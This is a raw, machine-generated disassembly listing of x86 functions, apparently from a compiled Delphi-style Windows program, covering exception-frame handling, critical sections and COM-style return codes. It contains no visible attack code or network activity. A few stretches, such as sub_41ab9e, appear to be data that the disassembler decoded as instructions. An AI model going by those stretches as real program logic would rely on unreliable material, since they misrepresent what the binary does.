pop ebp
retn
sub_415e5f
jmp sub_403e54
sub_415e66
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e85
mov eax [ rw-data ]
call sub_40d8e4
retn
sub_415e7e
jmp sub_403e54
sub_415e85
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_415ef1
jmp sub_403e54
sub_415ef8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415ff3
jmp sub_403e54
sub_415ffa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_416010
jmp sub_403e54
sub_416078
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41639c
xor edx edx
mov eax ebx
call sub_416360
pop ebx
retn
sub_4160f0
mov eax [ ebp + 0x4 ]
retn
sub_416126
pop ecx
pop edx
pop esi
pop ebx
retn
sub_416174
jmp sub_403e54
sub_41617b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416180
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_416198
xor edx edx
call sub_4161a0
retn
sub_416288
mov edx [ eax + 0x8 ]
dec edx
call sub_4161a0
retn
sub_41640c
retn
sub_41660a
jmp sub_403e54
sub_4166ca
jmp sub_403e54
sub_416792
jmp sub_403e54
sub_416799
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403a74
sub_416828
jmp sub_403e54
sub_41682f
pop ebx
pop ecx
pop ebp
retn
sub_416834
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41688b
jmp sub_403e54
sub_416892
pop ebx
pop ecx
pop ebp
retn
sub_416898
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4168d4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
retn
sub_4168ec
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_4169c7
retn
sub_4169c8
cmp edx [ eax + 0x4 ]
jae sub_4168d4
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_416a84
test edx edx
je r-xdata
xor edx edx
call sub_416a98
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_416b4e
jmp sub_403e54
sub_416b55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416b68
xchg edx eax
call sub_416a98
retn
sub_416b70
retn
sub_416c09
jmp sub_403e54
sub_416c10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416dcd
jmp sub_403e54
sub_416dd4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416f3d
jmp sub_403e54
sub_416f44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f88
xor edx edx
call sub_416e44
retn
sub_417058
mov ecx eax
mov dl 0x1
mov eax [ eax + 0x4 ]
call [ eax + 0x1c ]
retn
sub_4170e2
jmp sub_403e54
sub_4170fc
inc [ eax + 0xc ]
retn
sub_417100
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41716a
jmp sub_403e54
sub_417178
dec [ eax + 0xc ]
call sub_417100
retn
sub_4171b4
xor eax eax
retn
sub_4171b8
push ebx
mov ebx ecx
mov eax ebx
call sub_40442c
pop ebx
retn
sub_4172ae
jmp sub_403e54
sub_4172b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4173c5
jmp sub_403e54
sub_4174bc
retn
sub_4174c0
retn
sub_417500
retn
sub_417504
retn
sub_417570
mov eax [ eax + 0x18 ]
retn
sub_417676
jmp sub_403e54
sub_41767d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41769a
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_417693
jmp sub_403e54
sub_41769a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41771b
jmp sub_403e54
sub_417734
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4177f0
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_417899
jmp sub_403e54
sub_4178a0
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4178ac
mov eax [ ebp + 0x4 ]
retn
sub_4178e2
pop ecx
pop edx
pop esi
pop ebx
retn
sub_417930
jmp sub_403e54
sub_417937
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4179f6
jmp sub_403e54
sub_4179fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a1f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
sub_417a18
jmp sub_403e54
sub_417a1f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a28
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_417a30
xor eax eax
retn
sub_417a79
jmp sub_403e54
sub_417a80
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417b93
jmp sub_403e54
sub_417b9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417c28
jmp sub_403e54
sub_417c2f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ce8
jmp sub_403e54
sub_417cef
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417db0
jmp sub_403e54
sub_417db7
pop esi
pop ecx
pop ebp
retn
sub_417e3d
jmp sub_403e54
sub_417e44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e61
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_417e5a
jmp sub_403e54
sub_417e61
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417eec
jmp sub_403e54
sub_417f09
jmp sub_403e54
sub_417f10
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417f48
retn
sub_417fcb
jmp sub_403e54
sub_417fd2
mov eax [ ebp - 0x8 ]
call sub_41a8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ff7
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_417ff0
jmp sub_403e54
sub_417ff7
mov esp ebp
pop ebp
retn
sub_418047
jmp sub_403e54
sub_41804e
pop esi
pop ecx
pop ebp
retn
sub_4180a1
jmp sub_403e54
sub_4180a8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4180b0
retn
sub_41812b
jmp sub_403e54
sub_418132
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4181cf
jmp sub_403e54
sub_4181d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181f3
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_4181ec
jmp sub_403e54
sub_4181f3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4181f8
retn
sub_418272
jmp sub_403e54
sub_418279
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418280
mov eax edx
mov edx ecx
call sub_408800
retn
sub_4182e8
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_418358
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_418374
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_418568
mov eax [ eax + 0x18 ]
retn
sub_41856c
mov eax [ eax + 0x14 ]
retn
sub_418608
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_418814
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402784
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_418850
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_418868
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41887c
mov edx sub_418868
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4188c4
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408800
retn
mov eax edx
mov edx ecx
call sub_4087c8
retn
sub_418900
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop ebp
retn 0x8
sub_418960
retn
sub_418c59
jmp sub_403e54
sub_418c60
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_418cc0
jmp sub_403e54
sub_418cc7
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418cd0
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x18 ]
pop ebx
retn
sub_418d2c
jmp sub_403e54
sub_418d33
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418d74
mov eax [ eax + 0x4 ]
call sub_408d0c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_418d84
mov eax [ eax + 0x4 ]
call sub_408d38
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_418dc0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_418f3c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_418fcc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418fe4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4191cf
jmp sub_403e54
sub_4191d6
mov esp ebp
pop ebp
retn
sub_419280
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
retn
sub_419308
mov [ eax + 0x18 ] edx
retn
sub_419484
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_412844
retn
sub_41950b
jmp sub_403e54
sub_419512
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4195be
jmp sub_403e54
sub_4195c5
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419769
jmp sub_403e54
sub_4197bb
jmp sub_403e54
sub_4197da
jmp sub_403e54
sub_4197e1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419800
mov eax [ rw-data ]
call sub_40d8e4
retn
sub_4197f9
jmp sub_403e54
sub_419800
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4198a3
jmp sub_403e54
sub_41992b
jmp sub_403e54
sub_419938
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
pop ebx
retn
sub_419950
mov eax [ rw-data ]
call sub_419938
retn
sub_419adc
jmp sub_403e54
sub_419ae3
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_40442c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_419c04
jmp sub_403e54
sub_419c0b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_419d02
jmp sub_403e54
sub_419d1f
jmp sub_403e54
sub_419d26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e24
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4188e0
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_419ee8
push ebx
mov ebx eax
mov eax ebx
call sub_41b6a8
cmp al 0x9
sete al
pop ebx
retn
sub_419f47
jmp sub_403e54
sub_419f4e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419ff4
jmp sub_403e54
sub_419ffb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a13a
jmp sub_403ba0
sub_41a166
jmp sub_403ba0
sub_41a208
jmp sub_403ba0
sub_41a2ab
jmp sub_403ba0
sub_41a435
jmp sub_403ba0
sub_41a477
jmp sub_403e54
sub_41a499
jmp sub_403e54
sub_41a4a7
in eax 0x5d
retn
sub_41a507
jmp sub_403e54
sub_41a5de
jmp sub_403e54
sub_41a5e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a8a8
mov dl 0x1
call sub_4199c4
retn
sub_41a9e9
jmp sub_403e54
sub_41a9f0
pop ebx
mov esp ebp
pop ebp
retn
sub_41a9f8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41b7b8
mov eax [ rw-data ]
call sub_419938
pop ebp
retn
j_sub_403ccc#3
jmp sub_403ccc
j_sub_403ccc
jmp sub_403ccc
sub_41ab9e
add [ eax ] eax
add [ eax ] al
push esp
jns r-xdata
imul edx [ edx - 0xf140002 ] 0x5f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ edx - 0x76ffbe55 ] ch
retn
sub_41abe4
jmp sub_403e54
sub_41ad2e
jmp sub_403e54
sub_41ad35
pop ecx
pop ecx
pop ebp
retn
sub_41b051
jmp sub_403e54
sub_41b058
pop ebx
mov esp ebp
pop ebp
retn
sub_41b2ff
jmp sub_403e54
sub_41b306
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4036c0
retn
sub_41b31f
jmp sub_403e54
sub_41b343
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403ba0
sub_41b37a
jmp sub_403ba0
sub_41b3b9
jmp sub_403e54
sub_41b3c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3e2
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404450
retn
sub_41b3db
jmp sub_403e54
sub_41b3e2
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b469
jmp sub_403ba0
sub_41b496
jmp sub_403e54
sub_41b49d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b4a8
push ecx
mov edx esp
mov ecx 0x4
call sub_419e60
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_419938
sub_41b5b5
jmp sub_403e54
sub_41b5bc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b69b
jmp sub_403e54
sub_41b6a2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b6f8
jmp sub_403e54
sub_41b6ff
pop ebx
pop ecx
pop ebp
retn
sub_41b947
jmp sub_403e54
sub_41b94e
pop ecx
pop ecx
pop ebp
retn
sub_41b991
jmp sub_403e54
sub_41b998
pop ebx
pop ecx
pop ebp
retn
sub_41ba34
jmp sub_403e54
sub_41ba3b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bae9
jmp sub_403e54
sub_41baf0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bafc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41bd52
jmp sub_403e54
sub_41bd59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd7e
mov eax [ ebp - 0x8 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_41bd77
jmp sub_403e54
sub_41bd7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bda3
lea eax [ ebp - 0x1c ]
call sub_406194
lea eax [ ebp - 0x18 ]
call sub_40442c
retn
sub_41bd9c
jmp sub_403e54
sub_41bda3
pop ebx
mov esp ebp
pop ebp
retn
sub_41bfa0
jmp sub_403e54
sub_41bfa7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bfdc
mov eax [ eax + 0x30 ]
call sub_416044
retn
sub_41c04c
call sub_41c17c
retn
sub_41c090
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419308
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41c16c
jmp sub_403e54
sub_41c173
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41c17c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_418b44
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41c194
test dl dl
je r-xdata
mov dl 0x8
call sub_41e064
retn
mov dl 0x9
call sub_41e064
retn
sub_41c1eb
jmp sub_403e54
sub_41c1f2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c28a
jmp sub_403e54
sub_41c291
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c3b6
jmp sub_403e54
sub_41c3bd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c6ff
jmp sub_403e54
sub_41c741
jmp sub_403e54
sub_41c7a0
jmp sub_403e54
sub_41c7a7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ca0c
mov dl 0x1
call sub_41e064
retn
sub_41ca14
xor edx edx
call sub_41e064
retn
sub_41cb0d
jmp sub_403e54
sub_41cbb8
jmp sub_403e54
sub_41cbbf
pop ecx
pop ebp
retn
sub_41cc4a
jmp sub_403e54
sub_41cc51
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ccb8
jmp sub_403e54
sub_41ccbf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cd3d
jmp sub_403e54
sub_41cd44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd61
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41cd5a
jmp sub_403e54
sub_41cd61
pop ebx
pop ecx
pop ebp
retn
sub_41ce8d
jmp sub_403e54
sub_41ce94
pop ecx
pop ecx
pop ebp
retn
sub_41d04f
jmp sub_403e54
sub_41d056
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d0bc
jmp sub_403e54
sub_41d0c3
pop ecx
pop ebp
retn
sub_41d0c8
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41d1cf
jmp sub_403e54
sub_41d1d6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d444
jmp sub_403e54
sub_41d4c8
jmp sub_403e54
sub_41d4cf
mov esp ebp
pop ebp
retn
sub_41d594
jmp sub_403e54
sub_41d59b
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d6b7
jmp sub_403e54
sub_41d6be
mov esp ebp
pop ebp
retn
sub_41d7fe
jmp sub_403e54
sub_41d805
pop ebx
mov esp ebp
pop ebp
retn
sub_41d887
jmp sub_403e54
sub_41d88e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41d8fc
jmp sub_403e54
sub_41d903
mov esp ebp
pop ebp
retn
sub_41dd31
jmp sub_403e54
sub_41dd8c
jmp sub_403e54
sub_41dd9d
jmp sub_403ba0
sub_41ddf9
jmp sub_403e54
sub_41de00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41de5e
jmp sub_403e54
sub_41de65
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41de6c
mov edx rw-data
mov ecx 0x4
call sub_41c0a8
retn
sub_41dfa1
jmp sub_403e54
sub_41dfa8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e056
jmp sub_403e54
sub_41e05d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e141
jmp sub_403ba0
sub_41e18e
jmp sub_403e54
sub_41e268
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41e444
sub_41e2c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a7f8
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41e2dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a7f8
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41e2f0
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41c940
retn
sub_41e2fc
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41c940
retn
sub_41e5a4
xor eax eax
retn
sub_41e5a8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41e5b0
xor eax eax
retn
sub_41e5b4
retn
sub_41e5b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404480
pop esi
pop ebx
retn
sub_41e5cc
mov eax [ eax + 0x4 ]
retn
sub_41e5d0
retn
sub_41e5d4
xor eax eax
retn
sub_41e5d8
retn
sub_41e5dc
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41e5e8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41e5f4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41e600
retn
sub_41e604
xchg edx eax
call sub_41a4ac
retn
sub_41e60c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41e694
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4038bc
pop esi
retn
sub_41e6a8
retn
sub_41e788
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404480
pop esi
pop ebx
retn
sub_41e7c8
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41e914
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403908
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41e92c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41e9b4
retn
sub_41e9fc
retn
sub_41ea34
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41eab4
mov al 0x1
retn
sub_41eab8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41eac0
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41eb68
xor eax eax
retn
sub_41eb6c
retn
sub_41eb98
retn
sub_41ec30
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41ec44
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_416044
retn
sub_41ed5f
jmp sub_403ba0
sub_41ed64
mov ebx 0x1
call sub_403f08
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41edc7
jmp sub_403ba0
sub_41edcc
mov ebx 0x80030103
call sub_403f08
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ee4a
jmp sub_403ba0
sub_41ee4f
mov ebx 0x80030009
call sub_403f08
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41eeae
jmp sub_403ba0
sub_41eeb3
mov ebx 0x8000ffff
call sub_403f08
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f07d
jmp sub_403e54
sub_41f08e
jmp sub_403ba0
sub_41f093
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0bc
lea eax [ ebp + 0xc ]
call sub_406194
retn
sub_41f0b5
jmp sub_403e54
sub_41f0bc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41f0c8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41f0d4
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41f0e0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41f0ec
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41f15c
jmp sub_403ba0
sub_41f161
mov esi 0x8000ffff
call sub_403f08
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f174
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41f1e1
jmp sub_403e54
sub_41f1e8
mov eax [ rw-data ]
call sub_4036c0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41f1f8
call sub_415784
retn
sub_41f45f
jmp sub_403e54
sub_41f466
pop ebp
retn
sub_41f831
jmp sub_403e54
sub_41f838
pop ebp
retn
sub_41f83c
sub [ rw-data ] 0x1
retn
sub_420299
add eax 0xffffffd8
jmp sub_424980
sub_4202a1
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_4207c4
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_420838
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4208ac
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4208b8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_420998
jmp sub_403e54
sub_42099f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420a2f
jmp sub_403e54
sub_420ac1
jmp sub_403e54
sub_420ac8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420b2c
jmp sub_403e54
sub_420b33
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420b9b
jmp sub_403e54
sub_420ba2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420c45
jmp sub_403e54
sub_420c4c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421064
push 0x30
mov ecx rw-data
call sub_415ac0
retn
sub_421074
push 0x30
mov ecx rw-data
call sub_415a80
retn
sub_421084
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4210a8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_42127c
push 0x11
mov ecx rw-data
call sub_415a80
retn
sub_4213bc
push ebx
mov ebx eax
mov eax ebx
call sub_421084
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_421476
jmp sub_403e54
sub_42147d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421493
jmp sub_403e54
sub_4214ac
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_421509
jmp sub_403e54
sub_421510
pop ebx
pop ecx
pop ebp
retn
sub_421689
jmp sub_403e54
sub_4216b1
jmp sub_403e54
sub_4216b8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_421724
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404688
pop esi
pop ebx
retn
sub_421798
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_4216f4
push eax
call MulDiv
neg eax
pop ebx
retn
sub_4217d4
mov eax [ eax + 0x10 ]
